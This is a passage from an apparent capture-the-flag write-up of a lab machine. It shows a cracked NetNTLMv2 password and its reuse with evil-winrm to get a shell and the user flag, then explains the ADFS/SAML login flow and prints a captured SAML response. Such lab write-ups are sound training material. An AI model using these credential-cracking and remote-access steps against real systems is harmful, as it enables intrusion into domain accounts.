</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>Qwertyuiop1234$$ (justin.bradley)     </span></mark></span><span class="SemanticString"><span>
1g 0:00:00:04 DONE (2025-01-15 17:22) 0.2114g/s 2265Kp/s 2265Kc/s 2265KC/s RAHFIATUL..Q+1/3_Goy?
Use the &quot;--show --format=netntlmv2&quot; options to display all of the cracked passwords reliably
Session completed.</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f78076ad6edb88e3b21dec" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With the password, I can log in with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">evil-winrm</code></span><span class="SemanticString"> and grab the user flag.</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f7807ea8ddf40958b8034d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/ghost]
└─$</span></mark></span><span class="SemanticString"><span> evil-winrm -u justin.bradley -p &#x27;Qwertyuiop1234$$&#x27; -i ghost.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>*Evil-WinRM* PS C:\Users\justin.bradley\Documents&gt;</span></mark></span><span class="SemanticString"><span> whoami

ghost\justin.bradley</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f780b58abbcd19a6aaf0a2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1fe0b98a88f780d6a79dff2d2fd85487" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">User Flag:</strong></span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f780dfac57f269bbce823a" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>*Evil-WinRM* PS C:\Users\justin.bradley\desktop&gt;</span></mark></span><span class="SemanticString"><span> type user.txt

c8c250d6************************</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f780c3806ccb503980b883" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1fe0b98a88f780bf9e5fdf9b85c7ef67" class="Divider"></div><h3 id="https://www.notion.so/1fe0b98a88f780b18eb7fbcd0c9a2f98" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/1fe0b98a88f780b18eb7fbcd0c9a2f98"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Post-Exploitation as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">DC01\justin.bradley</code></span><span class="SemanticString">:</span></span></h3><div id="https://www.notion.so/1fe0b98a88f780c0ab6cc97336cd5a51" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">TCP8443 — Ghost Core:</strong></span></span></p></div><div id="https://www.notion.so/1fe0b98a88f7805ea485d09fa1daccdd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With domain creds, I thought I can access Ghost Core, but turns out it’s only available to Administrator.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780959222f26dc590e4db" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/ghost/core_unauthorized.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/ghost/core_unauthorized.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1fe0b98a88f78089a510d361e60fce2a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll look at the login flow in more details. In my Burp history, there’s a series of POST requests and redirections between </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">core.ghost.htb</code></span><span class="SemanticString"> and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">federation.ghost.htb</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780c8969dcdec86c1bbe4" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/ghost/core_burp_flow.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/ghost/core_burp_flow.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1fe0b98a88f78091bbb5f008f109811e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">To fully understand the authentication flow here, some background knowledge of ADFS and SAML is needed.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f78070a11ad5611c4f6234" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1fe0b98a88f780f8ac40c6a45769bf87" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">ADFS and SAML Authentication:</strong></span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780a48d5fd707f643412d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/ad-fs-overview">Active Directory Federation Service (ADFS)</a></span><span class="SemanticString"> is a Microsoft identity service that enables SSO to third-party applications using domain credentials. It </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adfsod/7b6e4bb6-9e65-467f-a8bb-c7302a2e6de5">supports a few SSO protocols</a></span><span class="SemanticString"> such as WS-Federation — a legacy Microsoft protocol, OpenID Connect (OIDC) — a  modern standard widely adopted by applications, and Security Assertion Markup Language (SAML), which is used by Ghost Core.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f7809aa6abf8282c8cd01d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://docs.secureauth.com/ciam/en/saml-single-sign-on--sso--flow.html">This page</a></span><span class="SemanticString"> gives a nice visualization of the SAML authentication flow. In our case, Ghost Core is the Service Provider, and ADFS is the Identity Provider. The whole flow can be broken down into the following steps:</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f7806bb7fdd46cef1d921a" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/ghost/saml_flow.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/ghost/saml_flow.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1fe0b98a88f7803f9f90e8481c62a957" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><em class="SemanticString__Fragment SemanticString__Fragment--Italic">Step 1 — Accessing the Service Provider</em></span></span></p></div><div id="https://www.notion.so/1fe0b98a88f78087b9ddd5fc36c7b192" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The flow initiates at the Ghost Core page when I click on “Login using AD Federation”.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780f88fbdf76f3adc1637" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/ghost/core_home.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/ghost/core_home.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1fe0b98a88f78058ad3acf4a0adde516" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><em class="SemanticString__Fragment SemanticString__Fragment--Italic">Step 2 — Redirection to IDP</em></span></span></p></div><div id="https://www.notion.so/1fe0b98a88f78029b937d059b7e227a8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">A request is sent to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/api/login</code></span><span class="SemanticString">, in which the application responds with 302 redirecting to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">federation.ghost.htb/adfs/ls/</code></span><span class="SemanticString"> with a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">SAMLRequest</code></span><span class="SemanticString"> token embedded in the URL.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780239b0df774a1e2f104" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/ghost/core_api_login.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/ghost/core_api_login.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1fe0b98a88f780fb8db8ec848f8e9870" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><em class="SemanticString__Fragment SemanticString__Fragment--Italic">Steps 3 and 4 — IDP authentication</em></span></span></p></div><div id="https://www.notion.so/1fe0b98a88f7806fa29fd0e189e01321" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The resulting page is the ADFS login portal, where I’m asked to authenticate with domain credentials. </span></span></p></div><div id="https://www.notion.so/1fe0b98a88f7809a8e67e76582d74519" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/ghost/adfs_login.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/ghost/adfs_login.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1fe0b98a88f78097bc0fc1f2409dd99a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><em class="SemanticString__Fragment SemanticString__Fragment--Italic">Step 5 — IDP returns SAML Response</em></span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780c5ba29c3c471afb916" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Once ADFS validated my authentication request, it returns a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">SAMLResponse</code></span><span class="SemanticString"> token:</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f7805dbe09c981ae63ec69" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/ghost/core_saml_resp.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/ghost/core_saml_resp.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1fe0b98a88f78041971ecf82b4ec30a1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It’s basically base64-encoded XML data containing my identity.</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f78088ab9fc0ff48788341" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token prolog">&lt;?xml version="1.0"?></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">samlp:</span>Response</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>samlp</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>urn:oasis:names:tc:SAML:2.0:protocol<span class="token punctuation">"</span></span> <span class="token attr-name">ID</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_352cb200-9e44-459c-a6fd-0b2caf873ff8<span class="token punctuation">"</span></span> <span class="token attr-name">Version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2.0<span class="token punctuation">"</span></span> <span class="token attr-name">IssueInstant</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2025-05-21T13:44:50.893Z<span class="token punctuation">"</span></span> <span class="token attr-name">Destination</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://core.ghost.htb:8443/adfs/saml/postResponse<span class="token punctuation">"</span></span> <span class="token attr-name">Consent</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>urn:oasis:names:tc:SAML:2.0:consent:unspecified<span class="token punctuation">"</span></span> <span class="token attr-name">InResponseTo</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_48451e698d43e3c56a3ff258dc7c494616607987<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Issuer</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>urn:oasis:names:tc:SAML:2.0:assertion<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>http://federation.ghost.htb/adfs/services/trust<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Issuer</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">samlp:</span>Status</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">samlp:</span>StatusCode</span> <span class="token attr-name">Value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>urn:oasis:names:tc:SAML:2.0:status:Success<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">samlp:</span>Status</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Assertion</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>urn:oasis:names:tc:SAML:2.0:assertion<span class="token punctuation">"</span></span> <span class="token attr-name">ID</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_03002929-93dd-4b76-8c52-822441c806f8<span class="token punctuation">"</span></span> <span class="token attr-name">IssueInstant</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2025-05-21T13:44:50.846Z<span class="token punctuation">"</span></span> <span class="token attr-name">Version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Issuer</span><span class="token punctuation">></span></span>http://federation.ghost.htb/adfs/services/trust<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Issuer</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">ds:</span>Signature</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>ds</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2000/09/xmldsig#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">ds:</span>SignedInfo</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">ds:</span>CanonicalizationMethod</span> <span class="token attr-name">Algorithm</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/10/xml-exc-c14n#<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">ds:</span>SignatureMethod</span> <span class="token attr-name">Algorithm</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/04/xmldsig-more#rsa-sha256<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">ds:</span>Reference</span> <span class="token attr-name">URI</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#_03002929-93dd-4b76-8c52-822441c806f8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">ds:</span>Transforms</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">ds:</span>Transform</span> <span class="token attr-name">Algorithm</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2000/09/xmldsig#enveloped-signature<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">ds:</span>Transform</span> <span class="token attr-name">Algorithm</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/10/xml-exc-c14n#<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">ds:</span>Transforms</span><span class="token punctuation">></span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">ds:</span>DigestMethod</span> <span class="token attr-name">Algorithm</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/04/xmlenc#sha256<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">ds:</span>DigestValue</span><span class="token punctuation">></span></span>lp5ogGrzEUFjaHAfsnjjHuPrV4uoanPDq3LEZZSQKuc=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">ds:</span>DigestValue</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">ds:</span>Reference</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">ds:</span>SignedInfo</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">ds:</span>SignatureValue</span><span class="token punctuation">></span></span>hMdbtM97j5WL6cskPj+S8J7jDYyacbKHP7xee/Ba4IpqQChyv97UylP83IKFW5gMQRlDbZFH7NTzKQx04VdHQbIR2xHpJ81rNY3SKJS/GsakrPioD5Ou4swSzl5zmJbO7tNc7icpff8eOhvVkE5DbvPZLrUxV28hEz4zWPbGdAJabkAQJda6rwq+HLhwGPTW9om6wVL1+yJ6IetZ2lkyNIpjjDmeJKqaw5/3LGQLgWnCPra0spAoTfyWMdDcg6XHCYEOpguViqoxBpCayLEHM6dOoJS1IEgjRzf9/gbAXwG8Z2A+SAbLZHcI4rNLtKNmrNKIHBfbiRcz9WrZ7f01H/6Yy4MfTWhpxyrds5ZO9XvtLfnMEuWlzUuadqZBYmWltJk1Fp1orodxdupzVeCMKIWltlPjIlKoox3WXBY17F0/meGgIuu6DwMdtkkcdp8EiYIuSLgny45gq79JcXGgSWW/5y0PomJYb2a4xNF3Ib3jXtcpx0IfsHBpHVHIpQa5AKUAC1g4jjt4gVenVuDq9QlzuUiMajm/xl9E+4WnU+8WeK4n6fxYSkDpE5/8x1Yn+1Rxxvr2C+SggzSOa1d7LItbkU6RuGlbsNBgJWNTMWd2g6Sq6DXX+qSaelQ9850AO5qy27+QTCywyK0vx2eIcXC+UdG6WD4BsbmVWV2cycQ=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">ds:</span>SignatureValue</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>KeyInfo</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2000/09/xmldsig#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">ds:</span>X509Data</span><span class="token punctuation">></span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">ds:</span>X509Certificate</span><span class="token punctuation">></span></span>MIIE5jCCAs6gAwIBAgIQJFcWwMybRa5O4+WO5tWoGTANBgkqhkiG9w0BAQsFADAuMSwwKgYDVQQDEyNBREZTIFNpZ25pbmcgLSBmZWRlcmF0aW9uLmdob3N0Lmh0YjAgFw0yNDA2MTgxNjE3MTBaGA8yMTA0MDUzMDE2MTcxMFowLjEsMCoGA1UEAxMjQURGUyBTaWduaW5nIC0gZmVkZXJhdGlvbi5naG9zdC5odGIwggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQC+AAOIfEqtlYcn153L1BvGQgDyXTnYwTRzsK59+zE1zgGKO9N5nb8Fk+daKpWLQaiH7oDHaenw/QaxBg5qdeDYmD3oz8KyaA1ygYBrzm4wW7Ff87rK9Fe5J5/h6W9g749h5BIqPQOp0l6s1rfumOccN4ybW95EWNL0vuQXvC+KQ4D4gMXu8mCGpxtvIL8ilNtJuIG3ORYSKhRal0yyJeOhG4xglrZJF18p9whnE6omggmA6n2shDk/tvTYjii5e7/icWTKkrsMCpaKUNk7mxdMZhQab7SmfKrZN4pRD7dVg5zzIyD7UzS9CHLC6xNzq/Z0huaOaJhOSdJSgat/bsG8nbx19HD/+ypW9J2LtNFugdWtmUBWDOQBYVhB8Sg4VEGgP9jyItHH2bzsDfjRdJ8E1uNJWP/kQA1+wYlOddLqU3b0IsCvlA8EvYW0T1Rsu77o4x/w0gWb0oQPEIz7z973b496wqQt3DnyfeO3lXXfZNcvaj5KCP2TtGB+KshF9pkIPxq7F2gMh7QjxjRHsA29V8jFo9gLD7kPVicaIUdsgiFHnYQF14a52JtR1V5iN+h95JkuuEqQWDBHAvPEBBZkEZH+5yT+aCFXXX+BpPt3QGjYLeJU8CFsMtn8QVLYvLdcVRsUnRh/WHiXwJOOEVECa9w7/yVnhalCNBx1E/l4KQIDAQABMA0GCSqGSIb3DQEBCwUAA4ICAQAWYKZW3cDCBO6dT3yfl3Ocuyp1LVKVI+9pFx/bbWpWjSdh6b39LTxxD7FYUthuWPZ3rF4G+FdMFHHCx3YpEmUFnELKsXqhZ989AX58I/3mbfUlKWeIPLSLkp+eRZoMJkt7k1/KXtDasOQn0NsgYEowLBImMCMu9uujnCmFOwHP/IBhgYQMHh46BzSXWP3i8VXbrRtDpo/c//OFJhGmnnF8ZPmi4xtzfSDBpVKqwVLp78CguMxjQd+bdUb45588ZJ4CLsPdRQp30WJ1/CNIaenvJWtA2G5IZw5U0EWCJLoYJWFs9iyOa1/y55ruW6J8lIGD0wmoEeCl9CH1Ed4dzUdUXf1MBCYP3X92iaxzUE0upGd/1Qo6HTyyOlWuAwrkT2VHELKVZKOg8+dly97gyZIfUtQwIkPwNl8vo04cfj+hzOvBzPKAAYh14NLgveAI/DqMnO0OKO+w1HBKw64NBCn8goazF+PuFfUO0yNHFL4kxMpcap6iev6g3BXCSDwfqTUOEuEs7q9oYKgq2qnNVOTIhhInMXBzEm6iP13jfuOoXJdPAnEUXn4y5ywA97rtbGnZEPyx1f1EkX/hbqBP4vogv9kltaUEEVXkS+hPpxZmexCNrBD1q7GJ/50ebYlC0Cev8w6Ms8tM0OrvppGYlWrtPwevEvfiRkwBLG7EMAnLSw==<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">ds:</span>X509Certificate</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">ds:</span>X509Data</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>KeyInfo</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">ds:</span>Signature</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Subject</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SubjectConfirmation</span> <span class="token attr-name">Method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>urn:oasis:names:tc:SAML:2.0:cm:bearer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SubjectConfirmationData</span> <span class="token attr-name">InResponseTo</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_48451e698d43e3c56a3ff258dc7c494616607987<span class="token punctuation">"</span></span> <span class="token attr-name">NotOnOrAfter</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2025-05-21T13:49:50.893Z<span class="token punctuation">"</span></span> <span class="token attr-name">Recipient</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://core.ghost.htb:8443/adfs/saml/postResponse<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>SubjectConfirmation</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Subject</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Conditions</span> <span class="token attr-name">NotBefore</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2025-05-21T13:44:50.799Z<span class="token punctuation">"</span></span> <span class="token attr-name">NotOnOrAfter</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2025-05-21T14:44:50.799Z<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>AudienceRestriction</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Audience</span><span class="token punctuation">></span></span>https://core.ghost.htb:8443<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Audience</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>AudienceRestriction</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Conditions</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>AttributeStatement</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Attribute</span> <span class="token attr-name">Name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>AttributeValue</span><span class="token punctuation">></span></span>justin.bradley@ghost.htb<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>AttributeValue</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Attribute</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Attribute</span> <span class="token attr-name">Name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://schemas.xmlsoap.org/claims/CommonName<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
